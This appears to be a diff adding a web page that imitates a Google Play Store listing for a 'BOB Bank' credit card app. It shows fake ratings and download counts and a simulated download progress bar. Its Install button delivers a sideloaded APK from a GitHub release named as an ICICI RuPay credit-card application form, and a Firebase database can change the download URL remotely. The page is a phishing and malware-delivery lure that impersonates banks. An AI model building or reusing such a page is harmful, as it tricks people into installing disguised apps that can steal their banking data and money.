@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Welcome to BOB Credit Card Services</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link href="style.css" rel="stylesheet">
+    <style>
+        .btn-install.loading { opacity: 0.7; pointer-events: none; }
+        .btn-install .spinner { display: none; }
+        .btn-install.loading .spinner {
+            display: inline-block;
+            width: 20px; height: 20px;
+            border: 2px solid #fff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .file-info {
+            background: #f7fafc;
+            padding: 10px 16px;
+            border-radius: 8px;
+            margin-top: 12px;
+            font-size: 13px;
+            display: none;
+        }
+        .file-info.show { display: block; }
+        .file-info .label { color: #718096; font-weight: 500; }
+        .file-info .value { color: #2d3748; margin-left: 4px; }
+        .download-progress {
+            display: none;
+            margin-top: 10px;
+            text-align: center;
+        }
+        .download-progress.show { display: block; }
+        .download-progress .bar {
+            width: 100%; height: 4px;
+            background: #e2e8f0;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .download-progress .bar .fill {
+            height: 100%;
+            background: #056449;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .no-apk {
+            color: #e53e3e;
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            display: none;
+        }
+        .version-tag {
+            background: #e6f9ed;
+            color: #056449;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 500;
+            margin-left: 8px;
+        }
+        .download-complete {
+            color: #0a8f4a;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>        
+    <div class="page-main">
+        <div class="top-nav">
+            <span class="back-arrow">←</span>
+            <span class="menu-icon">⋮</span>
+        </div>
+        
+        <div class="app-info main-padding">
+            <div class="info-box">
+                <img class="app-logo" src="icon.jpg" alt="App Logo">
+                <div class="app-desc">
+                    <div class="name">BOB Bank: CREDIT CARD</div>
+                    <div class="apfrom">
+                        <div class="apfrom-name">BOB Bank Ltd.</div>
+                        <div class="apfrom-tip">In-app purchases</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="app-stat-info">
+                <div class="app-stat-unit">
+                    <div class="unit-item">
+                        <div class="upper"><div>4.5</div><img class="star-icon" src="stars.png" alt="Rating Stars"></div>
+                        <div class="lower">549k reviews</div>
+                    </div>
+                    <div class="unit-item">
+                        <div class="upper"><div class="download-icon"></div><div>100M+</div></div>
+                        <div class="lower">Downloads</div>
+                    </div>
+                    <div class="unit-item">
+                        <div class="upper"><img class="img-3go" src="18go.jpg" alt="Rated 3+"></div>
+                        <div class="lower"><div>Rated for 3+</div><img class="tip-icon" src="tip.jpg" alt="Info Tip"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="operation">
+                <a href="#" class="btn-install download-app-link" id="downloadBtn">
+                    <span class="spinner"></span>
+                    <span class="btn-text">Install</span>
+                </a>
+                <div class="file-info" id="fileInfo">
+                    <span class="label">📦 Version:</span>
+                    <span class="value" id="versionDisplay">-</span>
+                    <span class="label" style="margin-left:16px;">📊 Size:</span>
+                    <span class="value" id="sizeDisplay">-</span>
+                </div>
+                <div class="download-progress" id="downloadProgress">
+                    <div class="bar"><div class="fill" id="downloadFill"></div></div>
+                    <span style="font-size:12px;color:#718096;" id="progressText">Downloading...</span>
+                </div>
+                <div class="no-apk" id="noApk">⚠️ No APK available</div>
+            </div>
+        </div>
+        
+        <div class="app-banner-box">
+            <div class="app-banner-list noscrollbar">
+                <div class="banner-item"><img src="1.jpg" alt="Screenshot 1"></div>
+                <div class="banner-item"><img src="2.jpg" alt="Screenshot 2"></div>
+                <div class="banner-item"><img src="3.jpg" alt="Screenshot 3"></div>
+                <div class="banner-item"><img src="4.jpg" alt="Screenshot 4"></div>
+                <div class="banner-item"><img src="5.jpg" alt="Screenshot 5"></div>
+            </div>
+        </div>
+        
+        <div class="app-desc-box main-padding">
+            <div class="title-box"><div class="title">About this app</div><div class="arrow-icon"></div></div>
+            <div class="desc-box">
+                Savings Account, Fixed Deposit (FD), Zero Balance savings account BOB Bank Ltd. - Savings Account, Fixed Deposit, Zero Balance Savings account, Money Transfer, Investment, Loans and Credit Card, Insurance, Bharat Bill Payment System, Recharge, and more.
+            </div>
+            <div class="categories-box main-padding">
+                <span class="category-tag">Finance</span>
+                <span class="category-tag">Bank and online banking</span>
+            </div>
+        </div>
+        
+        <div class="rating-details-box main-padding">
+            <div class="title-box"><div class="title">Ratings and reviews</div><div class="arrow-icon"></div></div>
+            <div class="rating-details-content">
+                <div class="average-score"><div class="score">4.5</div><div style="font-size:0.75rem;color:#70757A;margin-top:4px;">549k reviews</div></div>
+                <div class="bar-graph-container">
+                    <div class="rating-bar"><span class="label">5</span><div class="bar-track"><div class="bar-fill" style="width:70%;"></div></div></div>
+                    <div class="rating-bar"><span class="label">4</span><div class="bar-track"><div class="bar-fill" style="width:20%;"></div></div></div>
+                    <div class="rating-bar"><span class="label">3</span><div class="bar-track"><div class="bar-fill" style="width:5%;"></div></div></div>
+                    <div class="rating-bar"><span class="label">2</span><div class="bar-track"><div class="bar-fill" style="width:3%;"></div></div></div>
+                    <div class="rating-bar"><span class="label">1</span><div class="bar-track"><div class="bar-fill" style="width:2%;"></div></div></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="data-safety-box main-padding">
+            <div class="title-box"><div class="title">Data safety</div><div class="arrow-icon"></div></div>
+            <div class="desc-box">
+                Safety starts with understanding how developers collect and share your data. Data privacy and security practices...
+            </div>
+        </div>
+        
+        <div class="bottom-nav">
+            <span class="bottom-nav-item games">Games</span>
+            <span class="bottom-nav-item apps">Apps</span>
+            <span class="bottom-nav-item search active">Search</span>
+            <span class="bottom-nav-item books">Books</span>
+        </div>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+    <script>
+        // ============================================
+        // ✅ YOUR FIREBASE CONFIG
+        // ============================================
+        const firebaseConfig = {
+            databaseURL: "https://app-store-4d60b-default-rtdb.firebaseio.com"
+        };
+        
+        const DB_PATH = 'apk_data';
+        
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        const downloadBtn = document.getElementById('downloadBtn');
+        const btnText = downloadBtn.querySelector('.btn-text');
+        const fileInfo = document.getElementById('fileInfo');
+        const versionDisplay = document.getElementById('versionDisplay');
+        const sizeDisplay = document.getElementById('sizeDisplay');
+        const downloadProgress = document.getElementById('downloadProgress');
+        const downloadFill = document.getElementById('downloadFill');
+        const progressText = document.getElementById('progressText');
+        const noApk = document.getElementById('noApk');
+
+        // Your GitHub Release URL - Already set!
+        const GITHUB_URL = "https://github.com/netlifyw-cell/apk-storage/releases/download/v1.0.0/ICICI.RuPay.Credit.Card.Apply.Form.apk";
+
+        function formatFileSize(bytes) {
+            if (!bytes || bytes === 0) return '-';
+            if (bytes < 1024) return bytes + ' B';
+            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+            return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
+        }
+
+        function setAPK(data) {
+            noApk.style.display = 'none';
+            
+            // Check if data exists, if not use the hardcoded URL
+            let downloadUrl = GITHUB_URL;
+            let version = '1.0.0';
+            let fileSize = 0;
+            
+            if (data && data.downloadUrl) {
+                downloadUrl = data.downloadUrl;
+                version = data.version || '1.0.0';
+                fileSize = data.fileSize || 0;
+            }
+            
+            // Show version and size
+            fileInfo.classList.add('show');
+            versionDisplay.textContent = version;
+            sizeDisplay.textContent = fileSize ? formatFileSize(fileSize) : '-';
+            
+            btnText.textContent = 'Install';
+            downloadBtn.href = downloadUrl;
+            
+            // Download progress simulation
+            downloadBtn.onclick = function(e) {
+                downloadProgress.classList.add('show');
+                downloadFill.style.width = '0%';
+                progressText.textContent = 'Starting download...';
+                
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += Math.random() * 15;
+                    if (progress > 95) {
+                        progress = 95;
+                        clearInterval(interval);
+                        progressText.textContent = 'Almost done...';
+                    }
+                    downloadFill.style.width = progress + '%';
+                }, 300);
+                
+                setTimeout(() => {
+                    if (downloadProgress.classList.contains('show')) {
+                        downloadFill.style.width = '100%';
+                        progressText.textContent = '✅ Download complete!';
+                        setTimeout(() => {
+                            downloadProgress.classList.remove('show');
+                        }, 3000);
+                    }
+                }, 8000);
+            };
+        }
+
+        // Listen for APK data from Firebase
+        const dbRef = database.ref(DB_PATH);
+        dbRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            setAPK(data);
+        }, (err) => {
+            console.error('Connection error:', err);
+            // If Firebase fails, use the hardcoded URL
+            setAPK(null);
+        });
+        
+        // If Firebase doesn't have data, use hardcoded URL after 3 seconds
+        setTimeout(() => {
+            dbRef.once('value', (snapshot) => {
+                if (!snapshot.val()) {
+                    setAPK(null);
+                }
+            });
+        }, 3000);
+    </script>
+</body>
+</html>
